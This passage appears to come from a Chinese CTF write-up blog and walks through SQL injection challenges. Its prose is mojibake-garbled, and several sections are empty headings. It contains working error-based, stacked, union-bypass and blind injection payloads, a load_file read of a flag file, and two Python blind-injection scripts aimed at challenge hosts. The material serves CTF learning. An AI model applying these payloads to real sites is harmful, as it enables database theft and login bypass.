<p>æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå…ˆåœ¨æäº¤è®¢å•çš„æ—¶å€™çš„åœ°å€å¤„æ„é€ ä¸€ä¸ªç”¨æ¥æ³¨å…¥çš„è¯­å¥ï¼Œç„¶åå†ä¿®æ”¹ä¸€ä¸‹è®¢å•ï¼Œå®Œæˆæ³¨å…¥ã€‚åˆ©ç”¨updatexmlå‡½æ•°å› ä¸ºæ ¼å¼çš„é”™è¯¯ï¼Œå›æ˜¾äº†å…³é”®ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å¦‚ä¸‹æŠ¥é”™æ³¨å…¥æ”»å‡»è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;å¦‚æœflagå¤ªé•¿çš„è¯ï¼Œé€šè¿‡æ”¹å˜substrçš„èµ·å§‹å€¼ï¼Œå°±å¯ä»¥æŠŠflagå‰©ä¸‹çš„éƒ¨åˆ†æŸ¥å‡ºæ¥</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF2019-EasySQL">SUCTF2019 EasySQL</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>
<p>å †å æ³¨å…¥</p>
</li>
<li>
<p>sql_modeå‚æ•°</p>
<blockquote>
<p>Oracle åœ¨ç¼ºçœæƒ…å†µä¸‹æ”¯æŒä½¿ç”¨ <code>&quot; || &quot;</code>è¿æ¥å­—ç¬¦ä¸² ï¼Œ <strong>ä½†æ˜¯åœ¨MySQLä¸­ç¼ºçœä¸æ”¯æŒ</strong> ï¼ŒMySQL ç¼ºçœä½¿ç”¨ CONCAT ç³»åˆ—å‡½æ•°æ¥è¿æ¥å­—ç¬¦ä¸²</p>
</blockquote>
</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144001.png" style="zoom:67%;" />
<p>FUZZåå‘ç°è¿‡æ»¤äº†ä¸å°‘å…³é”®å­—ï¼Œå¯ä»¥è¾“å…¥å•ä¸ªæ•°å­—ï¼Œè¾“å‡ºçš„è¯­å¥åº”è¯¥æ˜¯ç”¨<code>var_dump()</code>å‡½æ•°ï¼Œè€ƒè™‘å †å æ³¨å…¥ã€‚</p>
<p>è¯»å–å½“å‰æ•°æ®è¡¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144413.png" alt=""></p>
<p>ä½†æ˜¯Flagä¹Ÿè¢«è¿‡æ»¤äº†ã€‚æ®è¯´æ¯”èµ›çš„æ—¶å€™æ³„éœ²æºç äº†ã€‚ã€‚ã€‚</p>
<p><strong>è¿æ¥æ•°æ®åº“å¹¶ä»URLè·å–å‚æ•°</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617144958.png" alt=""></p>
<p><strong>å¯¹è·å–çš„å‚æ•°è¿›è¡Œå¤„ç†åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ ï¼Œ å¹¶ä¸”è¿”å›ç»“æœ</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145024.png" alt=""></p>
<p>å…¶å®ä¸»è¦å°±æ˜¯ SQL æŸ¥è¯¢è¯­å¥ : <strong><code>select &quot;.$post['query'].&quot;||flag from Flag&quot;;</code></strong></p>
<p>å¯ä»¥é€šè¿‡ä¿®æ”¹ sql_mode æ¨¡å¼ : <strong>PIPES_AS_CONCAT</strong> æ¥å®ç°å°† <code>&quot; || &quot;</code>è§†ä¸º <strong>å­—ç¬¦ä¸²è¿æ¥ç¬¦</strong> è€Œé <strong>æˆ–</strong> è¿ç®—ç¬¦ã€‚</p>
<p>payloadï¼š<code>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></p>
<p>æ‹¼æ¥åå°±å˜æˆäº† <code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617145626.png" alt=""></p>
<h3 id="éé¢„æœŸ">éé¢„æœŸ</h3>
<p>Payload : <code>\*,1</code></p>
<p>æ‹¼æ¥åå°±å˜æˆäº† <code>SELECT \* ,1 || flag FROM Flag</code></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL">æå®¢å¤§æŒ‘æˆ˜ 2019 EasySQL</h2>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL">æå®¢å¤§æŒ‘æˆ˜ 2019 LoveSQL</h2>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL">æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL</h2>
<h2 id="æå®¢å¤§æŒ‘æˆ˜2019-HardSQL">æå®¢å¤§æŒ‘æˆ˜2019 HardSQL</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>MySQLæŠ¥é”™æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<p>å…³é”®è¯FUZZä¸€ä¸‹å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œorï¼Œupdateï¼Œhandlerï¼Œ/ï¼Œ=ç­‰å¸¸è§å­—ç¬¦ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼š</p>
<p>çˆ†æ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br><span class="line">&#x2F;&#x2F; geek</span><br></pre></td></tr></table></figure>
<p>çˆ†æ•°æ®è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#</span><br><span class="line">&#x2F;&#x2F; H4rDsq1</span><br></pre></td></tr></table></figure>
<p>çˆ†åˆ—å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#</span><br><span class="line">&#x2F;&#x2F; id,username,password</span><br></pre></td></tr></table></figure>
<p>çˆ†å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8</span><br></pre></td></tr></table></figure>
<p>å‘ç°æ˜¾ç¤ºä¸å®Œå…¨ï¼Œsubstr()å‡½æ•°æ— æ•ˆï¼Œå¯ä»¥ä½¿ç”¨reverse()å‡½æ•°ç¿»è½¬ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#</span><br><span class="line">&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨left()å’Œright()å‡½æ•°ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#</span><br><span class="line">&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æå®¢å¤§æŒ‘æˆ˜2019-FinalSQL">æå®¢å¤§æŒ‘æˆ˜2019 FinalSQL</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>MySQL regxç›²æ³¨</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>è¿›å…¥é¢˜ç›®ç»™äº†å‡ ä¸ªhintï¼Œé¦–å…ˆç¡®å®šæ˜¯ç›²æ³¨ï¼Œå½“id=6çš„æ—¶å€™å›æ˜¾<code>Clever! But not this table.</code>ã€‚</p>
<p>ç™»å½•æ¡†ç»è¿‡æµ‹è¯•åæ²¡æœ‰å¯æ³¨å…¥çš„ç‚¹ï¼Œå°è¯•idå‚æ•°åå‘ç°è¿‡æ»¤ç©ºæ ¼ï¼Œ/**/ä»¥åŠifç­‰å…³é”®å­—ã€‚æµ‹è¯•æ³¨å…¥ç‚¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^length(database())&gt;0</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾<code>Clever! But not this table.</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^length(database())&lt;0</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾<code>ERROR</code></p>
<p>ç”±äºè¿‡æ»¤äº†ifå…³é”®å­—ï¼Œæ‰€ä»¥è¦ä½¿ç”¨regexç›²æ³¨ï¼Œç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure>
<p>ç¡®å®šæ³¨å…¥ç‚¹å’Œpayloadå½¢å¼åå¼€å§‹ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Clever! But not this table.&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        response = requests.get(url + payload.format(index=i, char=mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabysqliV1">GXYCTF2019 BabysqliV1</h2>
<blockquote>
<p>åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼</p>
<p>(BUUCTFæ²¡æœ‰æç¤ºå•Š!!!)</p>
</blockquote>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>SQLè”åˆæŸ¥è¯¢</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>å…ˆFUZZä¸€æ³¢è¿‡æ»¤äº†æŸäº›å­—ç¬¦ï¼Œå¸¸è§„çš„æ³¨å…¥éƒ½æ²¡èƒ½passï¼ŒæŸ¥çœ‹æºç å‘ç°ä¸€ä¸ª<code>search.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200621142049.png" alt=""></p>
<blockquote>
<p>å…ˆè¯´è¯´base32 å’Œ base64 çš„åŒºåˆ«ï¼Œ<br>
base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—æ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚<br>
base64 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå°å†™å­—æ¯ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚<br>
æ˜æ˜¾ï¼Œé‚£æ®µæ–‡å­—æ˜¯base32åŠ å¯†</p>
</blockquote>
<p>è§£å¯†åï¼š<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p>
<p>ç»§ç»­base64è§£å¯†ï¼š<code>select * from user where username = '$name'</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1  &#x2F;&#x2F; wrong user!    </span><br><span class="line">&gt;&gt;&gt; do not hack me!  &#x2F;&#x2F; orå’Œ&#x3D;è¢«è¿‡æ»¤äº†</span><br><span class="line">name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1   &#x2F;&#x2F; å¤§å°å†™ç›´æ¥ç»•è¿‡äº†</span><br><span class="line">name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1</span><br><span class="line">&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;å¯ä»¥çŸ¥é“æœ‰ä¸‰ä¸ªcolumn</span><br></pre></td></tr></table></figure>
<p>ç›²çŒœå­—æ®µåä¸º<code>id</code>ã€<code>username</code>ã€<code>password</code>ï¼Œå½“<code>username</code>ä¸º<code>admin</code>æ—¶ä¼šè¯´<code>wrong pass!</code>ï¼Œå…¶ä»–éƒ½æ˜¯<code>wrong user!</code>ï¼Œusernameåº”è¯¥å°±æ˜¯<code>admin</code>äº†ã€‚</p>
<p>é‚£ä¹ˆé€»è¾‘å°±æ˜¯ï¼š<strong>å…ˆåˆ¤æ–­<code>username</code>åœ¨ä¸åœ¨æ•°æ®åº“,å†åˆ¤æ–­å¯†ç å¯¹ä¸å¯¹</strong>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢çš„æ—¶å€™ä¼šåˆ›ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨å•ï¼Œè®©ä»–æŸ¥è¿™ä¸ªè™šæ‹Ÿè¡¨ã€‚</p>
<p>ä¸‹é¢çŒœæµ‹adminåœ¨å“ªä¸ªå­—æ®µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,3#</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çŸ¥é“æœ‰adminç”¨æˆ·çš„ï¼Œç»æµ‹è¯•<code>name=1'union select 1,'admin',3#</code>æŠ¥å¯†ç é”™è¯¯ï¼Œè¯´æ˜è¿™é‡Œå°±æ˜¯usernameäº†ï¼Œpasswordå­—æ®µåº”è¯¥æ˜¯3çš„ä½ç½®ã€‚</p>
<p>è¿™é“é¢˜å¾—çŒœå®ƒçš„åç«¯æºç æ˜¯æ€ä¹ˆå†™çš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd = md5($_POST[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">&quot;Wrong Pass&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äºnameå‚æ•°å¯æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ sqlè¯­å¥ä½¿å…¶æŸ¥è¯¢ä¸ºå‡ï¼Œç„¶åè”åˆæŸ¥è¯¢å‡ºä¸€ä¸ªæ¯”å¦‚<code>0f5ed8a8d8d44d86a570aacffa922251</code>(ca01hçš„md5)ï¼Œç„¶åå¯†ç è¾“å…¥<code>ca01h</code>ï¼Œå°±ä¼šæŸ¥è¯¢æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#</span><br><span class="line">password &#x3D; ca01h</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/453.html">https://www.gem-love.com/ctf/453.html</a></p>
</blockquote>
<h2 id="RCTF2015-EasySQL">RCTF2015 EasySQL</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li>æŠ¥é”™æ³¨å…¥</li>
<li>äºŒæ¬¡æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<p>ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œæ³¨å†Œã€ç™»å½•å’Œä¿®æ”¹å¯†ç ï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬éƒ½æ˜¯äºŒæ¬¡æ³¨å…¥çš„é—®é¢˜ã€‚</p>
<p>åœ¨æ³¨å†Œé¡µé¢ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œ<code>username</code> å’Œ <code>email</code> å¤„æœ‰è¿‡æ»¤ï¼Œç›´æ¥ fuzz ä¸€ä¸‹å“ªäº›å­—ç¬¦è¢«ç¦äº†</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212053.png" alt=""></p>
<p>æ³¨å†Œç”¨æˆ·å<code>zzz\</code>ï¼Œåœ¨ç‚¹å‡»ä¿®æ”¹å¯†ç åï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212223.png" alt=""></p>
<p>çŒœæµ‹SQLè¯­å¥åº”è¯¥æ˜¯è¿™æ ·å†™çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zzz\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼çˆ†å‡ºæ•°æ®</p>
<ul>
<li>
<p>è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~root@localhost~'</code></p>
</li>
<li>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~web_sqli~'</code></p>
</li>
<li>
<p>æŸ¥çœ‹æ•°æ®åº“çš„è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~article,flag,users~'</code></p>
</li>
<li>
<p>æŸ¥çœ‹<code>users</code>è¡¨ä¸­çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~name,pwd,email,real_flag_1s_her'</code></p>
<p>ä½¿ç”¨reverseå‡½æ•°æŸ¥çœ‹åé¢çš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema'</code></p>
</li>
<li>
<p>æŸ¥çœ‹<code>real_flag_1s_here</code>å­—æ®µçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'</code></p>
<p>çœ‹åˆ°æœ‰å¾ˆå¤šåƒåœ¾æ•°æ®ï¼Œç”¨<code>regexp</code>åŒ¹é…<code>f</code>å¼€å¤´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3'</code></p>
<p>å†ç”¨reverseå‡½æ•°è¯»åé¢çš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>è¿”å›<code>XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64'</code></p>
</li>
</ul>
<h2 id="GYCTF2020-Ezsqli">GYCTF2020 Ezsqli</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li>æ— information_schemaå¸ƒå°”ç›²æ³¨</li>
<li>æ— åˆ—åæ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714113824.png" style="zoom: 50%;" />
<p>è¿‡æ»¤å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚information_schemaã€unionâ€¦selectã€joinã€ifã€andã€orç­‰ç­‰ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è€ƒè™‘ç›²æ³¨äº†ã€‚</p>
<p>å¦å¤–è¿˜å‘ç°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||1&#x3D;1</span><br><span class="line">è¿”å›Nu1l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||1&#x3D;5</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬æ¥2æŸ¥è¯¢çš„æ˜¯V&amp;Nï¼Œå¦‚æœ<code>||</code>åé¢çš„è¡¨è¾¾å¼ä¸ºTrueåˆ™è¿”å›Nu1Lã€falseåˆ™è¿”å›V&amp;Nã€‚</p>
<p>åˆ¤æ–­ä¸€ä¸‹æ˜¯ä¸æ˜¯ç›²æ³¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||length(database())&gt;0</span><br><span class="line">è¿”å›Nu1l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||length(database())&lt;0</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure>
<p>ç¡®å®šæ˜¯ç›²æ³¨äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å†™è„šæœ¬ç”¨äºŒåˆ†æ³•ç›²æ³¨è¡¨åï¼Œå¯ä»¥ä½¿ç”¨sys.schema_table_statistics_with_buffer</p>
<blockquote>
<p>innodb_table_statså’Œinnodb_index_statså’Œsys.schema_table_statisticsä¹Ÿå¯ä»¥ä½¿ç”¨</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(target, i, mid)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢å°±è¦å®ç°æ— åˆ—åæ³¨å…¥</p>
<blockquote>
<p>åœ¨çŸ¥é“è¡¨åï¼Œä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>union</code>æ¥ç»™æœªçŸ¥åˆ—åâ€œé‡å‘½åâ€ï¼Œè¿˜å¯ä»¥åˆ©ç”¨æŠ¥é”™å‡½æ•°æ¥æ³¨å…¥å‡ºåˆ—åã€‚</p>
</blockquote>
<p>è¿™é“é¢˜å†æå‡ºä¸€ç§æ€è·¯ï¼Œasciiä½åç§»å¤§å°æ¯”è¾ƒã€‚åå­—å¬èµ·æ¥æ¯”è¾ƒç„ä¹ï¼Œä½†æ˜¯åŸç†å¾ˆç®€å•ï¼š</p>
<blockquote>
<p>æ ¸å¿ƒpayloadï¼š<code>(select 'admin','admin')&gt;(select * from users limit 1)</code></p>
</blockquote>
